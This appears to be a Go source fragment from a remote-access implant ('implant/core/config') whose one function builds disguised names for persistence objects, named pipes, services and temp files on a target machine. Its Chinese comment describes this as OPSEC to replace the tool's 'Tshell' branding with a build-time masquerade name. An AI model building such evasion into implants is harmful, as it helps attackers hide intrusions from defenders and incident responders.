package commands

import "implant/core/config"

// masquerade 返回伪装修饰前缀 + 后缀。
// 品牌字符串清理（OPSEC）：目标机可见的持久化对象名/命名管道/服务名/临时文件前缀
// 不再硬编码 "Tshell/tsh"，统一由编译期 MASQUERADE_NAME 占位符驱动（生成时 patch）。
func masquerade(suffix string) string {
	return config.MasqueradeName() + suffix
}
